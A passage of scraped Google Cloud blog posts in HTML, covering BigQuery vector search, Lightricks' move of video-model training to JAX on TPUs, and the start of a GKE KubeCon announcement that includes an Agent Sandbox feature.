database</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Maintain this additional infrastructure, including server provisioning, scaling, and index management</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Develop custom pipelines to join vector search results back to their core business data</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deal with downtime during index rebuilds, a critical pain point for production systems</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This disjointed, expensive, and high-maintenance architecture was a barrier to entry for many teams.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">In the beginning: Focus on simplicity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We kicked off BigQuery vector search with one goal: to make the simplest vector database on the market. We built it to meet some core design requirements:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">It needs to be fully serverless:</strong><span style=\"vertical-align: baseline;\"> We knew early on that the best way to bring vector search to all BigQuery customers was to make it serverless. We first built the </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#create_an_ivf_vector_index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IVF index</span></a><span style=\"vertical-align: baseline;\">, combining the best of clustering and indexing, all within BigQuery. As a result, you don\u2019t need to provision </span><strong style=\"vertical-align: baseline;\">any new servers whatsoever</strong><span style=\"vertical-align: baseline;\"> to use vector search in BigQuery. This means you don't have to manage any underlying infrastructure for your vector database, freeing up your team to focus on what matters most: your data. BigQuery handles the scaling, maintenance, and reliability automatically. It can scale effortlessly to handle billions of embeddings, so your solution can grow with your business.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Index maintenance should be as simple as possible:</strong><span style=\"vertical-align: baseline;\"> BigQuery\u2019s vector indexes are a key part of this simplicity. You create an index with a simple </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create_vector_index_statement\"><code style=\"text-decoration: underline; vertical-align: baseline;\">CREATE VECTOR INDEX</code></a><span style=\"vertical-align: baseline;\"> SQL statement, and BigQuery handles the rest. As new data is ingested, the index </span><strong style=\"vertical-align: baseline;\">automatically and asynchronously refreshes</strong><span style=\"vertical-align: baseline;\"> to reflect the changes. And if the ingested data results in data distribution changes in the dataset, and in turn, in search accuracy degradation, it\u2019s no problem: You can use the </span><a href=\"https://cloud.google.com/bigquery/docs/vector-index#rebuild_a_vector_index\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Model Rebuild</code></a><span style=\"vertical-align: baseline;\"> feature to completely rebuild your index, without any index downtime, and with just one SQL statement.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">It should be integrated with GoogleSQL and Python:</strong><span style=\"vertical-align: baseline;\"> You can perform vector searches directly within your existing SQL workflows using a simple </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/search_functions#vector_search\"><code style=\"text-decoration: underline; vertical-align: baseline;\">VECTOR_SEARCH</code></a><span style=\"vertical-align: baseline;\"> function. This makes it easy to combine semantic search with traditional queries and joins. For data scientists, the integration with Python and tools like </span><strong style=\"vertical-align: baseline;\">LangChain</strong><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/bigquery/docs/use-bigquery-dataframes\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery DataFrames</span></a><span style=\"vertical-align: baseline;\"> makes it a natural fit for building advanced machine learning applications.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consistency needs to be guaranteed:</strong><span style=\"vertical-align: baseline;\"> New data is searchable via the </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/search_functions#vector_search\"><code style=\"text-decoration: underline; vertical-align: baseline;\">VECTOR_SEARCH</code></a><span style=\"vertical-align: baseline;\"> function immediately after ingestion, providing accuracy and consistency of the search results.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">You only pay for what you use:</strong><span style=\"vertical-align: baseline;\"> The </span><a href=\"https://cloud.google.com/bigquery/docs/vector-search-intro#pricing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery vector search pricing model</span></a><span style=\"vertical-align: baseline;\"> is designed for flexibility. This \"pay as you go\" model is great for both ad-hoc analyses and highly price-performant batch queries. This model emphasizes the ease of trying out the feature without a significant upfront investment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Security is a given:</strong><span style=\"vertical-align: baseline;\"> BigQuery\u2019s security infrastructure offers robust data -access control through </span><a href=\"https://cloud.google.com/bigquery/docs/row-level-security-intro\"><span style=\"text-decoration: underline; vertical-align: baseline;\">row-level security</span></a><span style=\"vertical-align: baseline;\"> (RLS) and </span><a href=\"https://cloud.google.com/bigquery/docs/column-level-security-intro\"><span style=\"text-decoration: underline; vertical-align: baseline;\">column-level security</span></a><span style=\"vertical-align: baseline;\"> (CLS). This multi-layered approach guarantees that users can only access authorized data, thereby bolstering protection and ensuring compliance.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">The early days: Growing with our customers</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As customers found success with early projects and moved more data into BigQuery, they told us about many data science workflows that they were \u201cupdating\u201d to use new embedding-based approaches. Here are a few examples of the various applications that vector search can enhance:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">LLM applications with retrieval augmented generation (RAG)</strong><span style=\"vertical-align: baseline;\">: By providing relevant business data, vector search helps ensure accurate and grounded responses from large language models.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Semantic search on business data</strong><span style=\"vertical-align: baseline;\">: Enable powerful, natural-language search capabilities for both internal and external users. For instance, a marketing team could search for \"customers who have a similar purchasing history to Jane\" and receive a list of semantically similar customer profiles.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Customer 360 and deduplication</strong><span style=\"vertical-align: baseline;\">: Use embeddings to identify similar customer records, even if details like names or addresses differ slightly. This is an effective way to cleanse and consolidate data for a more accurate, single view of your customer.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Log analytics and anomaly detection</strong><span style=\"vertical-align: baseline;\">: Ingest log data as embeddings and use vector search to quickly find similar log entries, even if the exact text doesn't match. This helps security teams identify potential threats and anomalies much faster.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enhance product recommendations</strong><span style=\"vertical-align: baseline;\">: Suggest visually or textually similar items (e.g., clothing) or semantically related complementary products.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Where we are now: Improving scale and cost performance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As customer usage grew, we enhanced our offering, observing significant demand for batch processing beyond RAG and generative AI workloads. Unlike traditional vector databases, improved batch vector search in BigQuery excels at high-throughput, analytical similarity searches on massive datasets. This allows data scientists to analyze billions of records simultaneously within their existing data environment, enabling previously prohibitive tasks such as:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Large-scale clustering:</strong><span style=\"vertical-align: baseline;\"> Grouping every customer in a database based on their behavioral embeddings</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Comprehensive anomaly detection:</strong><span style=\"vertical-align: baseline;\"> Finding the most unusual transaction for every single account in a financial ledger</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Bulk item categorization:</strong><span style=\"vertical-align: baseline;\"> Classifying millions of text documents or product images simultaneously</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In the second phase of development, we launched many new features to further improve the vector search experience:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">TreeAH, built using the ScaNN index, provides significant product differentiation in price / performance. Our customers\u2019 data science teams were moving more of their recommendation, clustering, and data pipelines to use vector search. We saw great improvements using </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-scann-in-bigquery-vector-search-for-large-query-batches\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TreeAH</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Various internal improvements to help increase the training and indexing performance and usability. For example, we added asynchronous index training, which increases usability and scalability as massive index training jobs are moved into the background. We also performed various internal optimizations to improve indexing performance, and reduce indexing latency without incurring additional costs for users.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/vector-index#stored-columns\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Stored columns</span></a><span style=\"vertical-align: baseline;\"> to help improve vector search performance:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Users can apply prefilers on the stored columns in the vector search query to greatly optimize search performance without sacrificing search accuracy.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">If users only query stored columns in the vector search query, search performance can be further improved by avoiding expensive joins with the base table.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/vector-index#partitions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Partitioned indexes</span></a><span style=\"vertical-align: baseline;\"> to dramatically reduce I/O costs and accelerate query performance by skipping irrelevant partitions. This is especially powerful for customers who frequently filter on partitioning columns, such as a date or region.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/vector-index#rebuild_a_vector_index\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Index model rebuilds</span></a><span style=\"vertical-align: baseline;\"> to help ensure that vector search results remain accurate and relevant over time. As your base data evolves, you can now proactively correct for model drift, maintaining the high performance of your vector search applications without index downtime.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead: Indexing all the things</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As businesses look to agentic AI, the data platform has never been more important. We imagine a world in which every business has their own AI mode for productivity, and retrieving relevant data is at the heart of productivity, including intelligent indexing of all relevant enterprise data, structured or unstructured, to automate AI and analytics. Indexing and search is core to Google. We look forward to sharing relevant technology innovations with you!</span></p></div>",
        "published_date": "2025-11-11 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/media-entertainment/how-lightricks-trains-video-diffusion-models-at-scale-with-jax-on-tpu/",
        "title": "How Lightricks trains video diffusion models at scale with JAX on TPU",
        "thumbnail": null,
        "author": "Yoav HaCohen, PhD",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"font-style: italic; vertical-align: baseline;\">Training large video diffusion models at scale isn't just computationally expensive \u2014 it can become impossible when your framework can't keep pace with your ambitions.\u00a0</span></p>\n<p><a href=\"http://jax.dev\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">JAX</span></a><span style=\"font-style: italic; vertical-align: baseline;\"> has become a popular computational framework across AI applications, now recognized for its capabilities in training large-scale AI models, such as LLMs and </span><a href=\"https://cloud.google.com/blog/topics/customers/escalante-uses-jax-on-tpus-for-ai-driven-protein-design\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">life sciences models</span></a><span style=\"font-style: italic; vertical-align: baseline;\">. Its strength lies not just in performance but in an expressive, scalable design that gives innovators the tools to push the boundaries of what's possible. We're consistently inspired by how researchers and engineers leverage JAX's ecosystem to solve unique, domain-specific challenges \u2014 including applications for generative media.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Today, we're excited to share the story of </span><a href=\"https://www.lightricks.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">Lightricks</span></a><span style=\"font-style: italic; vertical-align: baseline;\">, a company at the forefront of the creator economy. Their </span><a href=\"https://ltx.studio/blog/ltx-2-the-complete-ai-creative-engine-for-video-production\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">LTX-Video</span></a><span style=\"font-style: italic; vertical-align: baseline;\"> team is building high-performance video generation models, and their journey is a masterclass in overcoming technical hurdles. I recently spoke with Yoav HaCohen and Yaki Bitterman, who lead the video and scaling teams, respectively. They shared their experience of hitting a hard scaling wall with their previous framework and how a strategic migration to JAX became the key to unlocking the performance they needed.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Here, Yoav and Yaki tell their story in their own words. \u2013 </span><strong style=\"font-style: italic; vertical-align: baseline;\">Srikanth Kilaru</strong><span style=\"font-style: italic; vertical-align: baseline;\">, Senior Product Manager, Google ML Frameworks</span></p>\n<hr />\n<h3><strong style=\"vertical-align: baseline;\">The creator's challenge</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At Lightricks, our goal has always been to bring advanced creative technology to consumers. With apps like </span><a href=\"https://www.facetuneapp.com/?srsltid=AfmBOoo8ZXXKPBsz1wyL8Rvq9ZtL65N9K51p_yyRjM1DoH6EqZ1oEkLQ\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Facetune</span></a><span style=\"vertical-align: baseline;\">, we saw the power of putting sophisticated editing tools directly into people's hands. When generative AI emerged, we knew it would fundamentally change content creation.</span></p>\n<p><span style=\"vertical-align: baseline;\">We launched </span><a href=\"https://ltx.studio/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LTX Studio</span></a><span style=\"vertical-align: baseline;\"> to build generative video tools that truly serve the creative process. Many existing models felt like a \"prompt and pray\" experience, offering little control and long rendering times that stifled creativity. We needed to build our own models\u2014ones that were not only efficient but also gave creators the controllability they deserve.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our initial success came from training our first real-time video generation model on </span><a href=\"https://cloud.google.com/tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud TPUs </span></a><span style=\"vertical-align: baseline;\">with </span><a href=\"https://docs.pytorch.org/xla/release/r2.8/index.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PyTorch/XLA</span></a><span style=\"vertical-align: baseline;\">. But as our ambitions grew, so did the complexity. When we started developing our </span><a href=\"https://www.prnewswire.com/news-releases/lightricks-launches-13b-parameters-ltx-video-model-breakthrough-rendering-approach-generates-high-quality-efficient-ai-video-30x-faster-than-comparable-models-302447660.html#:~:text=LTXV%2D13B%20introduces%20%22multiscale%20rendering,LTX%20Video%20in%20the%20marketplace.\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">13-billion-parameter model</span></a><span style=\"vertical-align: baseline;\">, we hit a wall.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Hitting the wall and making the switch</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our existing stack wasn\u2019t delivering the training step times and scalability we needed. After exploring optimization options, we decided to shift our approach. We paused development to rewrite our entire training codebase in JAX, and the results were immediate. Switching to JAX felt like a magic trick, instantly providing the necessary runtimes.</span></p>\n<p><span style=\"vertical-align: baseline;\">This transition enabled us to effectively scale our tokens per sample (the amount of data processed in each training step), model parameters, and chip count. With JAX, sharding strategies (sharding divides large models across multiple chips) that previously failed now work out of the box on both small and large pods (clusters of TPU chips).</span></p>\n<p><span style=\"vertical-align: baseline;\">These changes delivered linear scaling that translates to 40% more training steps per day \u2014 directly accelerating model development and time to market. Critical issues with FlashAttention and data loading also worked reliably. As a result, our team's productivity skyrocketed, doubling the number of pull requests we could merge in a week.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Why JAX worked: A complete ecosystem for scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The success wasn't just about raw speed; it was about the entire </span><a href=\"https://docs.jax.dev/en/latest/index.html#ecosystem\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JAX stack</span></a><span style=\"vertical-align: baseline;\">, which provided the building blocks for scalable and efficient research.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">A clear performance target with MaxText:</strong><span style=\"vertical-align: baseline;\"> We used the open-source </span><a href=\"https://github.com/AI-Hypercomputer/maxtext\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MaxText </span></a><span style=\"vertical-align: baseline;\">framework as a baseline to understand what acceptable performance looked like for a large model on TPUs. This gave us a clear destination and the confidence that our performance goals were achievable on the platform.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">A robust toolset:</strong><span style=\"vertical-align: baseline;\"> We built our new stack on the core components of the JAX ecosystem based on the MaxText blueprint. We used </span><a href=\"https://flax.readthedocs.io/en/v0.8.3/index.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Flax</span></a><span style=\"vertical-align: baseline;\"> for defining our models, </span><a href=\"https://optax.readthedocs.io/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Optax</span></a><span style=\"vertical-align: baseline;\"> for implementing optimizers, and </span><a href=\"https://orbax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Orbax</span></a><span style=\"vertical-align: baseline;\"> for robust checkpointing \u2014 all core components that work together natively.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Productive development and testing:</strong><span style=\"vertical-align: baseline;\"> The transition was remarkably smooth. We implemented unit tests to compare our new JAX implementation with the old one, ensuring correctness every step of the way. A huge productivity win was discovering that we could test our </span><a href=\"https://docs.jax.dev/en/latest/notebooks/Distributed_arrays_and_automatic_parallelization.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sharding</span></a><span style=\"vertical-align: baseline;\"> logic on a single, cheap CPU before deploying to a large TPU slice. This allowed for rapid, cost-effective iteration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Checkpointing reliability:</strong><span style=\"vertical-align: baseline;\"> For sharded models, JAX\u2019s checkpointing is much more reliable than before, making training safer and more cost-effective.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Compile speed &amp; memory:</strong><span style=\"vertical-align: baseline;\"> JAX compilation with </span><a href=\"https://docs.jax.dev/en/latest/_autosummary/jax.lax.fori_loop.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">lax.fori_loop</span></a><span style=\"vertical-align: baseline;\"> is fast and uses less memory, freeing capacity for tokens and gradients.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Smooth scaling on a supercomputer:</strong><span style=\"vertical-align: baseline;\"> With our new JAX codebase, we were able to effectively train on a reservation of thousands of TPU cores. We chose TPUs because Google provides access to what we see as a \"</span><a href=\"https://cloud.google.com/solutions/ai-hypercomputer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">supercomputer</span></a><span style=\"vertical-align: baseline;\">\" \u2014 a fully integrated system where the </span><a href=\"https://cloud.google.com/tpu/docs/system-architecture-tpu-vm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">interconnects and networking</span></a><span style=\"vertical-align: baseline;\"> were designed first, not as an afterthought. We manage these large-scale training jobs with our own custom Python scripts on </span><a href=\"https://cloud.google.com/products/compute\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Compute Engine (GCE)</span></a><span style=\"vertical-align: baseline;\">, giving us direct control over our infrastructure. We also use </span><a href=\"https://cloud.google.com/storage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Storage</span></a><span style=\"vertical-align: baseline;\"> and stream the training data to the TPU virtual machines.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"JAX-Stack-Lightricks-Architecture\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/JAX-Stack-Lightricks-Architecture.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Architectural diagram showing the Lightricks stack</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><hr />\n<h3><strong style=\"vertical-align: baseline;\">Build your models with the JAX ecosystem</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Lightricks' story is a great example of how JAX's powerful, modular, and scalable design can help teams overcome critical engineering hurdles. Their ability to quickly pivot, rebuild their stack, and achieve massive performance gains is a testament to both their talented team and the tools at their disposal.</span></p>\n<p><span style=\"vertical-align: baseline;\">The JAX team at Google is committed to supporting innovators like Lightricks and the entire scientific computing community.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Share your story</strong><span style=\"vertical-align: baseline;\">: Are you using JAX to tackle a challenging scientific problem? We would love to learn how JAX is accelerating your research.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Help guide our roadmap</strong><span style=\"vertical-align: baseline;\">: Are there new features or capabilities that would unlock your next breakthrough? Your feature requests are essential for guiding the evolution of JAX.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Please reach out to the team via</span> <a href=\"https://github.com/google/jax\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GitHub</span></a><span style=\"vertical-align: baseline;\"> to share your work or discuss what you need from JAX. Check out documentation, examples, news, events and more at </span><a href=\"http://jaxstack.ai\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">jaxstack.ai</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"http://jax.dev\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">jax.dev</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Sincere thanks to Yoav, Yaki, and the entire Lightricks team for sharing their insightful journey with us. We're excited to see what they create next.</span></p></div>",
        "published_date": "2025-11-11 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/gke-and-kubernetes-at-kubecon-2025/",
        "title": "GKE: From containers to agents, the unified platform for every modern workload",
        "thumbnail": null,
        "author": "Drew Bradstock",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The past decade of cloud native infrastructure has been defined by relentless change \u2014 from containerization and microservices to the rise of generative AI. Through every shift, Kubernetes has been the constant, delivering stability and a uniform, scalable operational model for both applications and infrastructure.</span></p>\n<p><span style=\"vertical-align: baseline;\">As Google Kubernetes Engine (GKE) celebrates its 10th anniversary, its symbiotic relationship with Kubernetes has never been more important. </span><span style=\"vertical-align: baseline;\">With </span><span style=\"vertical-align: baseline;\">the increasing demand for Kubernetes to handle AI at its highest scale, Google continues to invest in strengthening Kubernetes\u2019 core capabilities, elevating all workloads \u2014 AI and non-AI alike. At </span><a href=\"https://rsvp.withgoogle.com/events/google-cloud-at-kubecon-north-america-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">KubeCon</span></a><span style=\"vertical-align: baseline;\"> North America this year, we\u2019re announcing major advancements that reflect our holistic three-pronged approach:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Elevate core Kubernetes OSS for next-gen workloads -</strong><span style=\"vertical-align: baseline;\"> This includes proactively supporting the agentic wave with our new Kubernetes-native AgentSandbox APIs for security, governance and isolation. Recently, we also added several capabilities to power inference workloads such as Inference Gateway API, and Inference Perf. In addition, capabilities such as Buffers API, and HPA help address provisioning latency from different angles for all workloads.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Provide GKE as the reference implementation for managed Kubernetes excellence -</strong><span style=\"vertical-align: baseline;\"> We continuously bring new features and best practices directly to GKE, translating our Kubernetes expertise into a fully managed, production-ready platform that integrates powerful Google Cloud services, and provides unmatched scale and security. We are excited to announce the new GKE Agent Sandbox, and we recently announced </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/concepts/about-compute-classes\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE custom compute classes</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/gke-inference-gateway-and-quickstart-are-ga?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/machine-learning/inference/inference-quickstart\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Quickstart</span></a><span style=\"vertical-align: baseline;\">. And to meet the demand for massive computation, we are pushing the limits of scale, with support for 130k node clusters.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">This year, we\u2019re also thrilled to announce our participation in the new </span><a href=\"https://www.cncf.io/blog/2025/08/01/help-us-build-the-kubernetes-conformance-for-ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CNCF Kubernetes Kubernetes AI Conformance program</span></a><span style=\"vertical-align: baseline;\">, which simplifies AI/ML on Kubernetes with a standard for cluster interoperability and portability. GKE is already </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/gke-ai-conformance\"><span style=\"text-decoration: underline; vertical-align: baseline;\">certified as an AI-conformant platform</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Drive frameworks and reduce operational friction -</strong><span style=\"vertical-align: baseline;\"> We actively collaborate with the open-source community and partners to enhance support for new frameworks, including Slurm and Ray on Kubernetes. We recently announced </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/ray-on-gke-new-features-for-ai-scheduling-and-scaling?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">optimized open-source Ray for GKE</span></a><span style=\"vertical-align: baseline;\"> with <span style=\"vertical-align: baseline;\">Anyscale Platform and Runtime</span> in collaboration with Anyscale. More recently, we became a founding contributor to </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/enhancing-vllm-for-distributed-inference-with-llm-d?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">llm-d</span></a><span style=\"vertical-align: baseline;\">, an open-source project in collaboration with partners to create a distributed, Kubernetes-native control plane for high-performance LLM inference at scale.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Now let\u2019s take a deeper look at the advancements.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Supporting the agentic wave</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Agentic AI wave is upon us. According to PwC, </span><span style=\"vertical-align: baseline;\">79%</span><span style=\"vertical-align: baseline;\"> of senior IT leaders are </span><a href=\"https://www.pwc.com/us/en/tech-effect/ai-analytics/ai-agent-survey.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">already adopting AI agents</span></a><span style=\"vertical-align: baseline;\">, and 88% plan to increase IT budgets in the next 12 months due to agentic AI.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Kubernetes already provides a robust foundation for deploying and managing agents at scale, yet the non-deterministic nature of agentic AI workloads introduces infrastructure challenges. Agents are increasingly capable of writing code, controlling computer interfaces and calling a myriad of tools, raising the stakes for isolation, efficiency, and governance.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">We\u2019re addressing these challenges by evolving Kubernetes\u2019 foundational primitives while providing high performance and compute efficiency for agents running on GKE. Today, we announced </span><strong style=\"vertical-align: baseline;\">Agent Sandbox</strong><span style=\"vertical-align: baseline;\">, a new set of capabilities for Kubernetes-native agent code execution and computer use environments, available in preview. Designed as open source from the get-go, Agent Sandbox relies on gVisor to isolate agent environments, so you can confidently execute LLM-generated code and interact with your AI agents.</span></p>\n<p><span style=\"vertical-align: baseline;\">For an even more secure and efficient managed experience, the new </span><strong style=\"vertical-align: baseline;\">GKE Agent Sandbox</strong><span style=\"vertical-align: baseline;\"> enhances this foundation with built-in capabilities such as integrated sandbox snapshots and container-optimized compute. Agent Sandbox delivers sub-second latency for fully isolated agent workloads, up to a 90% improvement over cold starts. For more details, please refer to this detailed announcement on </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/agentic-ai-on-kubernetes-and-gke\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Supercharging Agents on GKE</span></a><span style=\"vertical-align: baseline;\"> today. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Unmatched scale for the 